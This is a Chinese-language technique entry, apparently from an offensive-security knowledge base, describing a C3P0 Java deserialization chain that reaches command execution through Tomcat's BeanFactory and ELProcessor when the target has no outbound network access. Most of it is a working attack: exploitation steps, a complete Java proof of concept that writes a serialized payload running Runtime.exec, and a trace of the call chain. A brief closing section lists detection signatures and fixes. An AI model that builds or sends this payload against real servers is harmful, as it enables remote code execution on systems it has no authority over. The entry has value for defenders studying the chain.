---
id: web-java-deser-c3p0-beanfactory-el-no-egress
title: C3P0 反序列化不出网利用：Tomcat BeanFactory 结合 ELProcessor 执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: c3p0-beanfactory-el-no-egress
aliases:
- C3P0 不出网利用
- BeanFactory ELProcessor
- C3P0 Tomcat 本地工厂
- ResourceRef BeanFactory
- 反序列化不出网 RCE
tags:
- java
- deserialization
- c3p0
- tomcat
- beanfactory
- elprocessor
- no-egress
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: c3p0 0.9.5.2；tomcat-catalina 8.5.0；tomcat-embed-el 8.5.15
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:32:06+08:00'
  notes: 已对照原文核对 ResourceRef+BeanFactory+ELProcessor 不出网链及 forceString faster=eval 用法；未验证点：未在本机复现，原文于 JDK 8u102+Tomcat 8.5 依赖下 calc 验证
---

## 一句话结论

C3P0 `PoolBackedDataSourceBase` 反序列化链中的 `ReferenceableUtils.referenceToObject()` 还会对实例化的工厂类调用 `getObjectInstance()`；把 `Reference` 换成 Tomcat 的 `ResourceRef` + `BeanFactory` + `ELProcessor`，即可在目标不出网时通过 EL 表达式执行命令。

## 原理

- 与 URLClassLoader 链共用前半段：`PoolBackedDataSourceBase` 序列化不可序列化的 `connectionPoolDataSource` 时，生成 `ReferenceSerialized`；反序列化时 `ReferenceSerialized.getObject()` 调用 `ReferenceableUtils.referenceToObject()`。
- `referenceToObject()` 取出 `factoryClassName` 与 `factoryClassLocation`。当 location 为 null 时使用 TCCL 加载工厂类；随后 `newInstance()` 并调用 `getObjectInstance(reference, name, ctx, env)`。
- 攻击者让 `getReference()` 返回 `ResourceRef`：
  - `resourceClass`/`className` 为 `javax.el.ELProcessor`；
  - `factoryClassName` 为 `org.apache.naming.factory.BeanFactory`；
  - `StringRefAddr("forceString", "faster=eval")` 把属性 `faster` 映射到方法 `eval`；
  - `StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")")` 作为 `eval` 的参数。
- Tomcat 的 `BeanFactory.getObjectInstance()` 在收到 `ResourceRef` 时，会实例化 `beanClassName`（ELProcessor），解析 `forceString` 建立“属性名 → setter/方法”的映射，然后遍历 `RefAddr`，用反射调用映射的方法并传入地址值。
- 于是 `ELProcessor.eval("Runtime.getRuntime().exec(\"calc\")")` 被调用，EL 表达式求值执行命令。整个过程只使用目标本地已有的 Tomcat 类，不需要出网加载远程字节码。
- 这本质上是 JNDI 高版本利用中“本地 BeanFactory + ELProcessor”套路，只是入口从 JNDI lookup 换成了 C3P0 的 `referenceToObject()`。

## 触发条件

- 目标 classpath 含 c3p0（原文 0.9.5.2）与存在反序列化入口。
- 目标含 Tomcat 8 相关依赖：`tomcat-catalina`（提供 `org.apache.naming.factory.BeanFactory`）与 `tomcat-embed-el`（提供 `javax.el.ELProcessor`）；原文版本为 8.5.0 / 8.5.15。
- 目标未禁用 EL 求值或移除相关类；`BeanFactory` 可被加载。
- 不需要目标出网。

## 利用步骤

1. 确认目标依赖：c3p0、Tomcat 8 的 catalina/embed-el，以及反序列化入口。
2. 编写实现 `ConnectionPoolDataSource` 与 `Referenceable` 的类，`getReference()` 返回构造好的 `ResourceRef`。
3. 通过反射设置 `PoolBackedDataSourceBase.connectionPoolDataSource`，序列化生成 payload。
4. 发送 payload 到目标反序列化入口。
5. 目标反序列化时经 `referenceToObject()` 调用 `BeanFactory.getObjectInstance()`，EL 表达式执行命令。
6. 观察命令执行结果（写文件、反弹到内网等）。

## PoC

```java
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import javax.naming.*;
import javax.sql.*;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0BeanFactory {
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase ds = new PoolBackedDataSourceBase(false);
        Field f = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        f.setAccessible(true);
        f.set(ds, new Evil());

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("c3p0-el.bin"));
        out.writeObject(ds);
        out.close();
    }

    public static class Evil implements ConnectionPoolDataSource, Referenceable {
        public PrintWriter getLogWriter() { return null; }
        public void setLogWriter(PrintWriter out) {}
        public void setLoginTimeout(int seconds) {}
        public int getLoginTimeout() { return 0; }
        public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; }
        public PooledConnection getPooledConnection() { return null; }
        public PooledConnection getPooledConnection(String u, String p) { return null; }

        public Reference getReference() throws NamingException {
            ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "faster=eval"));
            ref.add(new StringRefAddr("faster",
                "Runtime.getRuntime().exec(\"calc\")"));
            return ref;
        }
    }
}
```

```text
# 反序列化 c3p0-el.bin 时：
# ReferenceableUtils.referenceToObject
# -> Class.forName("org.apache.naming.factory.BeanFactory")
# -> BeanFactory.getObjectInstance(ResourceRef)
# -> new javax.el.ELProcessor()
# -> forceString: faster=eval
# -> eval("Runtime.getRuntime().exec(\"calc\")")
```

## 变体与关联

- 变体：`forceString` 可映射其他方法名；`eval` 可执行任意 EL 表达式，如 `''.getClass().forName('java.lang.Runtime')...`。
- 变体：除 `javax.el.ELProcessor` 外，还可寻找其他可被 BeanFactory 实例化并调用危险方法的本地类。
- 关联：[[web-java-deser-c3p0-poolbackeddatasourcebase-urlclassloader]]（同一 C3P0 gadget 的 URLClassLoader 版本）；[[web-java-deser-fastjson-c3p0-jndiref-jndi]]（C3P0 的 JNDI 入口）；[[web-java-deser-fastjson-c3p0-hex-useroverrides]]（另一条不出网链）。
- 边界：目标必须存在 Tomcat 8 的 `BeanFactory` 与 `ELProcessor`；Tomcat 版本/依赖缺失、类被裁剪或 EL 被禁用时失效。原文在 JDK 8u102 + Tomcat 8 依赖下验证。

## 检测与防御

- 检测：监控反序列化流量中出现 `ResourceRef`、`org.apache.naming.factory.BeanFactory`、`javax.el.ELProcessor`、`forceString` 等特征；监控 `BeanFactory.getObjectInstance` 调用与 EL 求值；对异常 `Runtime.exec` 告警。
- 修复：移除/升级 c3p0；对反序列化入口做类白名单，阻断 `PoolBackedDataSourceBase`/`ResourceRef` 等危险类；升级 Tomcat 并限制 BeanFactory 的使用。
- 加固：禁用不必要的 EL 求值；使用 `ObjectInputFilter`/`jdk.serialFilter`；RASP 检测反序列化 gadget 链；最小化 classpath 中的 c3p0/Tomcat 组件。
